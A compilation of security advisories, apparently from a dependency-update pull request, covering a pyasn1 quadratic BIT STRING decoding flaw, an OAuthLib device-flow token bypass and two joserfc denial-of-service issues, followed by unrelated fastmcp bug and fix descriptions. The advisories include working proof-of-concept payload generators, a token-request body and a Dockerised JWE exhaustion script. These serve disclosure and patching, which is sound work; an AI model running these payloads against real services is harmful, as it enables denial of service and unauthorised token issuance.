The BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.

This is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://redirect.github.com/advisories/GHSA-8ppf-4f7h-5ppj).

##### Technical details

In the 0.6.4 [`BitStringPayloadDecoder`](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the [definite-length](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n²) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.

In 0.6.4, DER's [tag-driven map](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.

Under [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.

##### Impact

An application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.

##### Severity assessment (CVSS v3.1)

The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).

##### Reproducer

The definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.

```python
import time

from pyasn1.codec.ber import decoder as ber_decoder
from pyasn1.codec.cer import decoder as cer_decoder
from pyasn1.codec.der import decoder as der_decoder
from pyasn1.error import PyAsn1Error
from pyasn1.type import univ

def encode_length(size):
    octets = size.to_bytes((size.bit_length() + 7) // 8, "big")
    return bytes((0x80 | len(octets),)) + octets

def definite_fragments(count):
    body = b"\x03\x02\x00\xa5" * count  # one data octet per BIT STRING fragment
    return b"\x23" + encode_length(len(body)) + body

def cer_fragments(count):
    # Each primitive fragment has 1000 contents octets: one unused-bits
    # octet (zero) followed by 999 data octets.
    fragment = b"\x03" + encode_length(1000) + b"\x00" + b"\xa5" * 999
    return b"\x23\x80" + fragment * count + b"\x00\x00"

def measure(label, decode, payload, **options):
    start = time.process_time()
    value, remainder = decode(payload, **options)
    print(label, len(payload), f"{time.process_time() - start:.3f}s CPU")
    assert not remainder and len(value) > 0

for count in (50_000, 100_000, 200_000):
    measure(f"BER {count} fragments", ber_decoder.decode,
            definite_fragments(count))

for count in (1_000, 2_000, 4_000):
    measure(f"CER {count} fragments", cer_decoder.decode,
            cer_fragments(count))

sample = definite_fragments(1_000)
measure("DER with BIT STRING schema", der_decoder.decode, sample,
        asn1Spec=univ.BitString())
try:
    der_decoder.decode(sample)
except PyAsn1Error:
    print("DER without schema rejects the constructed value")
else:
    raise AssertionError("DER unexpectedly accepted schema-less input")
```

##### Verification

Local measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.

| Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU |
| --- | ---: | ---: | ---: |
| BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s |
| BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s |
| BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s |
| Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s |
| Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s |
| Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |

The definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.

##### Resolution

Upgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.

For applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

#### References
- [https://github.com/pyasn1/pyasn1/security/advisories/GHSA-2qm8-x737-gmw5](https://redirect.github.com/pyasn1/pyasn1/security/advisories/GHSA-2qm8-x737-gmw5)
- [https://nvd.nist.gov/vuln/detail/CVE-2026-119196](https://nvd.nist.gov/vuln/detail/CVE-2026-119196)
- [https://github.com/pyasn1/pyasn1/pull/132](https://redirect.github.com/pyasn1/pyasn1/pull/132)
- [https://github.com/pyasn1/pyasn1/commit/73ba7b043cc7e92cb37f16f2c955bff93b0e6f6c](https://redirect.github.com/pyasn1/pyasn1/commit/73ba7b043cc7e92cb37f16f2c955bff93b0e6f6c)
- [https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5](https://redirect.github.com/pyasn1/pyasn1/releases/tag/v0.6.5)
- [https://github.com/advisories/GHSA-2qm8-x737-gmw5](https://redirect.github.com/advisories/GHSA-2qm8-x737-gmw5)

### OAuthLib: Bearer token can be retrieved as long as client knows a valid client ID for device workflow
[CVE-2026-49272](https://nvd.nist.gov/vuln/detail/CVE-2026-49272) / [GHSA-3jp2-3mrg-2vxc](https://redirect.github.com/advisories/GHSA-3jp2-3mrg-2vxc)

<details>
<summary>More information</summary>

#### Details
##### Summary
A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.

##### Details

[Section 3.4 of the RFC 8628 spec](https://datatracker.ietf.org/doc/html/rfc8628#section-3.4) says that the token endpoint should take in `device_code` as a required parameter.`DeviceCodeGrant.validate_token_request` does not perform any validation of `device_code`. `DeviceCodeGrant.validate_token_request` should be validating that `device_code` was passed in as a parameter and that it is valid, similar to how `AuthorizationCodeGrant.validate_token_request` does the checks [here](https://redirect.github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L446) and [here](https://redirect.github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L483).

I would like to propose a new method be added to `RequestValidator` called `validate_device_code` that is similar to the `validate_code` method and is called inside of `DeviceCodeGrant.validate_token_request`.

##### PoC
Create an implementation of `RequestValidation.authenticate_client` that returns `True` if the client's `client_type` is `"public"`. You would find yourself in this scenario because there's another issue with `DeviceCodeGrant.validate_token_request` where it doesn't properly handle public clients (see [https://github.com/oauthlib/oauthlib/issues/919](https://redirect.github.com/oauthlib/oauthlib/issues/919)).

Create a client that has a `client_type` of `"public"` and set it's `grant_type` to `"urn:ietf:params:oauth:grant-type:device_code"`.

With this implementation of `RequestValidation.authenticate_client` done, use that validator for your token endpoint. Call the token endpoint with a body of 
```
{
  "client_id": <ID of the public client you made>,
  "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
  "device_code": <anything you want since it's not validated>
}
```

You now have a bearer token for the client without a valid `device_code`.

##### Impact
Anyone using the RFC 8628 device workflow in oauthlib that doesn't realize the `device_code` parameter is not being validated.

#### Severity
- CVSS Score: 8.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:N`

#### References
- [https://github.com/oauthlib/oauthlib/security/advisories/GHSA-3jp2-3mrg-2vxc](https://redirect.github.com/oauthlib/oauthlib/security/advisories/GHSA-3jp2-3mrg-2vxc)
- [https://github.com/oauthlib/oauthlib/pull/954](https://redirect.github.com/oauthlib/oauthlib/pull/954)
- [https://github.com/oauthlib/oauthlib/commit/77a5f1c8ce00da2b0b8c5f6e9cc129920085f114](https://redirect.github.com/oauthlib/oauthlib/commit/77a5f1c8ce00da2b0b8c5f6e9cc129920085f114)
- [https://github.com/oauthlib/oauthlib/releases/tag/v4.0.1](https://redirect.github.com/oauthlib/oauthlib/releases/tag/v4.0.1)
- [https://github.com/advisories/GHSA-3jp2-3mrg-2vxc](https://redirect.github.com/advisories/GHSA-3jp2-3mrg-2vxc)

This data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-3jp2-3mrg-2vxc) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).
</details>

### Release Notes

<details>
<summary>oauthlib/oauthlib (oauthlib)</summary>

### [`v4.0.1`](https://redirect.github.com/oauthlib/oauthlib/releases/tag/v4.0.1): 4.0.1

[Compare Source](https://redirect.github.com/oauthlib/oauthlib/compare/v4.0.0...v4.0.1)

#### Security

- **CVE-2026-49272** / GHSA-3jp2-3mrg-2vxc: The device code flow token endpoint did not validate the `device_code` parameter. A request with a known `client_id` and a bogus `device_code` could obtain a bearer token. `DeviceCodeGrant.validate_token_request` now calls `DeviceCodeGrant.validate_device_code()`, which rejects missing or unknown device codes (`invalid_request` / `invalid_grant`) and delegates the code's authorization status to the new `RequestValidator.validate_device_code()` hook, per RFC 8628 Section 3.5. (cherry-picked from [#​954](https://redirect.github.com/oauthlib/oauthlib/issues/954))

#### Upgrade note for device flow integrators

Custom `RequestValidator` implementations using the device flow must now implement `validate_device_code(client_id, code, request)`. Return one of the `DeviceCodeGrant.DEVICE_CODE_*` statuses for known codes, or `None` for an unknown code. When returning `AUTHORIZED`, the validator must also populate `request.user` and `request.scopes` from the stored authorization.

</details>

### joserfc: Compact JWS size guard allocates attacker-controlled segments before rejection
[CVE-2026-119284](https://nvd.nist.gov/vuln/detail/CVE-2026-119284) / [GHSA-9pg5-8c7x-5hfx](https://redirect.github.com/advisories/GHSA-9pg5-8c7x-5hfx)

<details>
<summary>More information</summary>

#### Details
##### Summary

joserfc 1.7.4 defines compact-JWS header, payload, and signature limits, but
calls `value.split(b".")` before validating them. Python `bytes.split()` copies
the attacker-controlled segments, so the current guard allocates roughly one
complete payload before rejecting it.

##### Reproduction

```bash
.venv-research/bin/python 06-practical-testing/preauth-memory-profile.py
```

The input is resident before a fork-isolated verifier runs, and every signature
is invalid.

| Input | Peak RSS delta | Amplification | Result |
|---:|---:|---:|---|
| 1 MiB | 1.11 MiB | 1.11× | size rejected |
| 4 MiB | 4.04 MiB | 1.01× | size rejected |
| 8 MiB | 8.04 MiB | 1.01× | size rejected |
| 16 MiB | 16.04 MiB | 1.00× | size rejected |
| 32 MiB | 31.74 MiB | 0.99× | size rejected |
| 64 MiB | 63.80 MiB | 1.00× | size rejected |

The unconstrained profile is the primary evidence: joserfc allocates an
additional attacker-sized object before producing its intended
`ExceededSizeError`. A separate baseline-plus-headroom stress test raises
`MemoryError` when that copy cannot fit, but this report does not characterize
an absolute `RLIMIT_AS` value as a realistic worker memory budget.

##### Security Argument

The issue is not that joserfc can prevent the transport layer from receiving a
large header. The issue is narrower: once bytes reach `deserialize_compact()`,
the library's existing size guard cannot fulfill its allocation-limiting purpose
because attacker-controlled segment copies are created first.

This differs from
[GHSA-frfh-8v73-gjg4](https://redirect.github.com/authlib/joserfc/security/advisories/GHSA-frfh-8v73-gjg4),
which concerned embedding already-loaded oversized segments in exception and log
messages. Here, the current implementation itself creates an additional
payload-sized allocation before its fixed size exception.

##### Recommended Fix

Check `len(value)` against a maximum compact-serialization size before
`split()`. If per-segment diagnostics are needed, locate delimiters with bounded
`find()` operations or memory views, validate offsets and lengths, and only then
materialize acceptable segments.

#### Severity
- CVSS Score: 6.9 / 10 (Medium)
- Vector String: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`

### joserfc: Unbounded JWE General JSON `recipients` Array Leads to CPU Exhaustion (DoS) via Repeated RSA Private-Key Decryption
[CVE-2026-119283](https://nvd.nist.gov/vuln/detail/CVE-2026-119283) / [GHSA-jpxq-7h8p-2q76](https://redirect.github.com/advisories/GHSA-jpxq-7h8p-2q76)

<details>
<summary>More information</summary>

#### Details
##### Summary

`joserfc.jwe.decrypt_json()`, the library's public parser for JWE General JSON Serialization, accepts an attacker-controlled `recipients` array of unbounded length and performs one full private-key decryption operation (`decrypt_cek`) for **every** recipient present in the input, with no cap on recipient count. An unauthenticated network attacker who can send a JWE General JSON document to any endpoint that decrypts it with an RSA key (e.g. RSA-OAEP) can force the victim to perform an arbitrary, attacker-chosen number of RSA private-key decryption operations from a single, relatively small HTTP request. This gives the attacker a highly asymmetric CPU-exhaustion (Denial of Service) primitive: local reproduction shows request size growing linearly with recipient count (~396 bytes/recipient) while server-side CPU time grows in lock-step (near 1:1 ratio between recipient-count growth and decrypt-time growth), and the library's only documented mitigation knob, `verify_all_recipients=False`, does **not** reduce the CPU cost, since the decrypt loop attempts every recipient's `decrypt_cek()` unconditionally before that flag is ever consulted. This is CWE-400 (Uncontrolled Resource Consumption) with CVSS v3.1 Base Score 7.5 (High).

##### Details

`joserfc` validates and caps several structural elements of a JWE (protected header size, encrypted key size, IV size, ciphertext size, and auth-tag size) inside `src/joserfc/_rfc7516/registry.py`, but performs **no validation whatsoever on the number of entries in the `recipients` array** of a JWE General JSON Serialization object.

Data flow (source → sink), verified directly against the repository source at commit `26a10275e88276184f91ae2a6409647bfac7fea5` (joserfc 1.7.4):

1. `src/joserfc/jwe.py:214` — public parser entry point `decrypt_json(data, private_key, ...)`. This is a documented, unauthenticated (at the library boundary) API for parsing externally supplied JWE JSON.
2. `src/joserfc/jwe.py:238` — if `"recipients"` is present in the input dict, `extract_general_json(...)` is invoked.
3. `src/joserfc/_rfc7516/json.py:84-86` — iterates `for item in data["recipients"]:` and appends a `Recipient` object for every entry, with **no upper bound check** on `len(data["recipients"])`:
   ```python
   for item in data["recipients"]:
       recipient = __extract_recipient(obj, item, registry)
       obj.recipients.append(recipient)
   ```
4. `src/joserfc/jwe.py:252` — the private key is attached to every extracted recipient.
5. `src/joserfc/_rfc7516/message.py:103-112` — `_perform_decrypt()` loops over **every** recipient in `obj.recipients` and calls `decrypt_recipient(...)` for each one, regardless of how many there are:
   ```python
   cek_set = set()
   for recipient in obj.recipients:
       headers = recipient.headers()
       registry.check_header(headers, True)
       alg = registry.get_alg(headers["alg"])
       try:
           cek = decrypt_recipient(alg, enc, recipient, tag)
           cek_set.add(cek)
   ```
6. `src/joserfc/_rfc7518/jwe_algs.py:74-83` — for RSA-OAEP/RSA1_5 recipients, this dispatches to the sink, a genuine RSA private-key operation:
   ```python
   def decrypt_cek(self, recipient: Recipient[RSAKey]) -> bytes:
       key = recipient.recipient_key
       assert key is not None
       self.check_key_type(key)
       op_key = key.get_op_key("decrypt")
       try:
           assert recipient.encrypted_key is not None
           cek = op_key.decrypt(recipient.encrypted_key, self.padding)
   ```

Confirmed by direct inspection of `src/joserfc/_rfc7516/registry.py`: size caps exist for `max_header_length`, `max_encrypted_key_length`, `max_iv_length`, `max_ciphertext_length`, and `max_auth_tag_length` (registry.py:52-62, 103-121), but no `max_recipients` (or equivalent) field or check exists anywhere in `registry.py`, `json.py`, or `jwe.py`.

Critically, the loop in `message.py:103-112` calls `decrypt_recipient()` for **every** recipient unconditionally — this happens *before* `registry.verify_all_recipients` is ever consulted. Setting `verify_all_recipients=False` (the library's only documented related option) therefore changes whether a decrypt failure raises an exception, but does **not** reduce the number of RSA private-key operations performed, and thus does not mitigate the CPU cost. This was independently confirmed at runtime (see PoC results below): decrypt time is statistically identical between `verify_all_recipients=True` and `verify_all_recipients=False` for the same recipient count.

`decrypt_json()` is not a demo-only or admin-only code path: it is documented in `docs/guide/jwe.rst:156-182` as the standard way to parse and decrypt an externally received General JSON JWE, and requires no special/non-default configuration to trigger. This is functionally analogous to two other resource-exhaustion issues already fixed in the same codebase — the PBES2 `p2c` iteration cap (`src/joserfc/_rfc7518/jwe_algs.py:237-239`) and the JWE compression "zip bomb" size cap (`src/joserfc/_rfc7518/jwe_zips.py:11,26-28`) — indicating the recipient-count case was simply missed from the same class of hardening.

##### PoC

Both static (Phase 1) and dynamic, containerized (Phase 2) reproduction confirmed the vulnerability against unmodified joserfc 1.7.4 source.

**Environment setup (Dockerfile):**

```dockerfile
FROM python:3.12-slim
WORKDIR /app

##### Copy the exact repository source under test (unmodified).
COPY repo /app/repo

##### Install joserfc from local source in editable/normal mode.
RUN pip install --no-cache-dir /app/repo

##### Copy the PoC script.
COPY vuln-001/poc.py /app/poc.py
ENTRYPOINT ["python3", "/app/poc.py"]
```

Build and run (source is used unmodified; container has no network access):

```bash
docker build -t joserfc-vuln001 -f vuln-001/Dockerfile .
docker run --rm --network none joserfc-vuln001 --recipients 1 500 1500
```

**PoC logic (`poc.py`):** generates a victim RSA-2048 keypair (representing the RSA key an application would use for RSA-OAEP JWE decryption), crafts a General JSON JWE (`GeneralJSONEncryption`) wrapping a small plaintext with an attacker-chosen number `n` of RSA-OAEP recipients (all using the victim's public key, which is inherently public for JWE encryption), then calls the unmodified public API `joserfc.jwe.decrypt_json()` and measures wall-clock decrypt time, once with `verify_all_recipients=True` and once with `verify_all_recipients=False`.

```python
def build_token(public_key, n_recipients: int) -> tuple[str, int]:
    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
    for _ in range(n_recipients):
        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
    token = jwe.encrypt_json(obj, None)
    size_bytes = len(json.dumps(token).encode())
    return token, size_bytes

def measure_decrypt(token, private_key, verify_all_recipients: bool) -> float:
    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
    t0 = time.perf_counter()
    out = jwe.decrypt_json(token, private_key, registry=registry)
    dt = time.perf_counter() - t0
    assert out.plaintext == b"hello"
    return dt
```

**Observed results (Phase 2, inside the Docker container, `--network none`, unmodified source):**

```
[*] Attacker crafts General JSON JWE with recipients=1 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.002
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.001
[*] Attacker crafts General JSON JWE with recipients=500 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.631
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.651
[*] Attacker crafts General JSON JWE with recipients=1500 ...
    verify_all_recipients=True  -> decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.874
    verify_all_recipients=False -> decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.875
[CHECK] recipient_count_ratio=1500.0x decrypt_time_ratio=937.0x
[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied recipient with
       no upper bound, and verify_all_recipients=False did not mitigate the cost.
```

Independent static-phase (Phase 1) reproduction against the same commit, outside the container, produced the same linear-scaling behavior (recipients=500 → 198,140 bytes → 0.627s; recipients=1500 → 594,140 bytes → 1.957s), and the original report's own local run showed recipients=1000 → 396,140 bytes → 1.254s; recipients=3000 → 1,188,140 bytes → 3.762s. In every run, `plaintext=b'hello'` was correctly recovered, confirming each crafted request is fully valid input, not malformed data rejected early.

In all cases, `verify_all_recipients=False` produced decrypt times statistically identical to `verify_all_recipients=True` for the same recipient count (e.g. 500 recipients: 0.631s vs 0.651s; 1500 recipients: 1.874s vs 1.875s), empirically confirming that this documented flag does not mitigate the CPU cost.

##### Impact

This is a remote, unauthenticated CPU-exhaustion Denial-of-Service vulnerability (CWE-400, Uncontrolled Resource Consumption). Any application that:

- exposes an endpoint (or message-processing path) that accepts JWE data in General JSON Serialization form, and
- decrypts it using `joserfc.jwe.decrypt_json()` with an RSA-based key-management algorithm (e.g. RSA-OAEP, RSA1_5)

is impacted. The attacker needs only the victim's RSA public key — which is inherently public, since it is used by legitimate senders to encrypt JWEs to the victim. Because request size scales linearly with recipient count (~396 bytes per recipient) while attacker-inflicted server CPU cost scales in lock-step with recipient count, the attacker gets a highly favorable cost asymmetry: e.g. a ~1.2 MB request forced ~3.8 seconds of RSA-2048 private-key decrypt operations in testing. Repeated or concurrent requests of this shape can exhaust available CPU/worker capacity on the victim service, degrading or denying availability for legitimate users. Confidentiality and integrity are not affected (no key material or plaintext is disclosed or corrupted); the impact is availability only, matching the CVSS vector's `C:N/I:N/A:H`.

##### Reproduction artifacts

##### `Dockerfile`

```dockerfile

##### VULN-001 dynamic reproduction environment
##### Unbounded JWE General JSON "recipients" array causes CPU exhaustion via

##### repeated RSA private-key decryption in joserfc's decrypt_json().
#

##### This image builds joserfc from the local repository clone (unmodified
##### source) and provides a Python environment to run poc.py against it.

FROM python:3.12-slim

WORKDIR /app

##### Copy the exact repository source under test (unmodified).
COPY repo /app/repo

##### Install joserfc from local source in editable/normal mode.
RUN pip install --no-cache-dir /app/repo

##### Copy the PoC script.
COPY vuln-001/poc.py /app/poc.py

ENTRYPOINT ["python3", "/app/poc.py"]
```

##### `poc.py`

```python
"""
VULN-001 dynamic PoC: Unbounded JWE General JSON "recipients" array causes
CPU exhaustion (CWE-400) via repeated RSA private-key decryption inside
joserfc's public parser API `joserfc.jwe.decrypt_json()`.

Data flow reproduced end to end (unmodified joserfc source):
  1. joserfc.jwe.decrypt_json()                         (src/joserfc/jwe.py:214)
  2. -> extract_general_json()                           (src/joserfc/_rfc7516/json.py:73)
  3. -> for item in data["recipients"]: (NO COUNT CAP)   (src/joserfc/_rfc7516/json.py:84)
  4. -> perform_decrypt() -> _perform_decrypt()          (src/joserfc/_rfc7516/message.py:93-112)
  5. -> for recipient in obj.recipients: decrypt_recipient(...) for EVERY recipient,
        regardless of registry.verify_all_recipients
  6. -> RSAAlgModel.decrypt_cek(): op_key.decrypt(...)   (src/joserfc/_rfc7518/jwe_algs.py:74-83)
     performs one real RSA-2048 private-key decrypt operation per recipient.

This script:
  (a) builds a victim RSA keypair (2048-bit, as an application would use for
      RSA-OAEP JWE decryption),
  (b) crafts a General JSON JWE token with an attacker-chosen number of
      RSA-OAEP recipients, all wrapping the SAME small ciphertext,
  (c) measures wall-clock CPU time joserfc's unmodified decrypt_json() spends
      processing the token as the recipient count grows,
  (d) shows that setting verify_all_recipients=False (the only public
      mitigation knob mentioned in the docs) does NOT reduce the CPU cost,
      because the decrypt loop in message.py always attempts every
      recipient's decrypt_cek() before that flag is ever consulted.

Deterministic PASS criteria (printed as machine-readable JSON lines):
  - decrypt_json() succeeds (returns correct plaintext) for all recipient counts.
  - decrypt_seconds scales roughly linearly with recipient count (attacker
    control over victim CPU cost, unbounded by the library).
  - decrypt_seconds for verify_all_recipients=False is statistically the same
    order of magnitude as verify_all_recipients=True for the same recipient
    count (proving the documented mitigation does not help).
"""

import argparse
import json
import time

from joserfc import jwe, jwk
from joserfc.jwe import GeneralJSONEncryption
from joserfc.jwe import JWERegistry

def build_token(public_key, n_recipients: int) -> tuple[str, int]:
    """Craft a General JSON JWE with n_recipients RSA-OAEP recipients,
    all wrapping the same small plaintext. This is exactly the shape an
    unauthenticated network attacker can send to any endpoint that calls
    jwe.decrypt_json() on external input, as documented in
    docs/guide/jwe.rst."""
    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
    for _ in range(n_recipients):
        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
    token = jwe.encrypt_json(obj, None)
    size_bytes = len(json.dumps(token).encode())
    return token, size_bytes

def measure_decrypt(token, private_key, verify_all_recipients: bool) -> float:
    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
    t0 = time.perf_counter()
    out = jwe.decrypt_json(token, private_key, registry=registry)
    dt = time.perf_counter() - t0
    assert out.plaintext == b"hello", f"unexpected plaintext: {out.plaintext!r}"
    return dt

def main():
    parser = argparse.ArgumentParser(description="VULN-001 dynamic reproduction PoC")
    parser.add_argument(
        "--recipients",
        type=int,
        nargs="+",
        default=[1, 500, 1500],
        help="Recipient counts to test (attacker-controlled array length).",
    )
    parser.add_argument(
        "--key-bits",
        type=int,
        default=2048,
        help="RSA key size of the victim's decryption key.",
    )
    args = parser.parse_args()

    print(f"[*] Generating victim RSA-{args.key_bits} keypair (RSA-OAEP JWE key)...")
    private_key = jwk.RSAKey.generate_key(args.key_bits)
    public_key = jwk.RSAKey.import_key(private_key.as_dict(private=False))
    print("[*] Victim private key generated locally; public key is what an attacker would normally have.")

    results = []
    for n in args.recipients:
        print(f"\n[*] Attacker crafts General JSON JWE with recipients={n} ...")
        token, size_bytes = build_token(public_key, n)

        dt_verify_true = measure_decrypt(token, private_key, verify_all_recipients=True)
        print(
            f"    verify_all_recipients=True  -> decrypt_json() succeeded, "
            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_true:.3f}"
        )

        dt_verify_false = measure_decrypt(token, private_key, verify_all_recipients=False)
        print(
            f"    verify_all_recipients=False -> decrypt_json() succeeded, "
            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_false:.3f} "
            f"(documented 'mitigation' does NOT reduce CPU cost)"
        )

        results.append(
            {
                "recipients": n,
                "size_bytes": size_bytes,
                "decrypt_seconds_verify_all_true": round(dt_verify_true, 3),
                "decrypt_seconds_verify_all_false": round(dt_verify_false, 3),
            }
        )

    print("\n[RESULT_JSON] " + json.dumps(results))

    # Deterministic scaling check: CPU time for the largest recipient count
    # must be substantially larger (order of magnitude, not noise) than for
    # the smallest, proving attacker control over victim CPU consumption.
    baseline = results[0]["decrypt_seconds_verify_all_true"]
    worst = results[-1]["decrypt_seconds_verify_all_true"]
    ratio = worst / baseline if baseline > 0 else float("inf")
    recipient_ratio = results[-1]["recipients"] / results[0]["recipients"]
    print(
        f"[CHECK] recipient_count_ratio={recipient_ratio:.1f}x "
        f"decrypt_time_ratio={ratio:.1f}x "
        f"(unbounded recipients => unbounded RSA-decrypt CPU cost, no cap in registry.py)"
    )

    if ratio < recipient_ratio * 0.3:
        print("[FAIL] Decrypt time did not scale with recipient count as expected.")
        raise SystemExit(1)

    print("[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied "
          "recipient with no upper bound, and verify_all_recipients=False did not mitigate the cost.")

if __name__ == "__main__":
    main()
```

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

title: fix: resolve transformed tool versions with enabled-source fallback
body:
`ToolTransformConfig(version="2.0")` advertises a tool as `2.0`, but calling that version raises `Unknown tool`. Expected: the advertised version is callable. This also handles disabled sources mapping to the same public version.

```python
import asyncio
from fastmcp import Client, FastMCP
from fastmcp.server.transforms import ToolTransform
from fastmcp.tools.tool_transform import ToolTransformConfig

server = FastMCP()

@server.tool(version="1.0")
def calc(x: int) -> int:
    return x

server.add_transform(ToolTransform({"calc": ToolTransformConfig(version="2.0")}))

async def main():
    async with Client(server) as client:
        print((await client.call_tool("calc", {"x": 1}, version="2.0")).data)

asyncio.run(main())  # Expected: 1; actual on main 936a9659: Unknown tool
```

title: fix(transforms): call re-versioned tools by their transformed version
body:
## Description

`ToolTransform` maps a requested name back to the original tool's name, but it passed the caller's version constraint down unchanged. When a `ToolTransformConfig` set a new version, that constraint was checked against the original tool's version rather than the one the tool is listed under. So a tool listed as 2.0 couldn't be called with `version="2.0"`, the unlisted original version still resolved, and a `VersionFilter(version_gte="2.0")` above the transform made the tool uncallable at any version.

When the config sets a version, `get_tool` now checks the caller's constraint against the transformed version, and if no original tool carries the requested version, it retries the lookup without one. An original tool whose own version matches the request is still preferred, so re-versioning one of several source versions onto an existing version keeps selecting that source. Transforms that don't set a version pass the constraint through as before.

One case is unchanged from main: if the highest source version is disabled and the config assigns a version no source carries, the listed version still can't be called, because the server doesn't fall back from a disabled version when one was requested explicitly. I left that server-level behavior alone here.

```python
mcp = FastMCP()

@mcp.tool(version="1.0")
def calc(x: int) -> int:
    return x

mcp.add_transform(ToolTransform({"calc": ToolTransformConfig(version="2.0")}))

async with Client(mcp) as client:
    await client.call_tool("calc", {"x": 1}, version="2.0")  # before: Unknown tool; now: 1
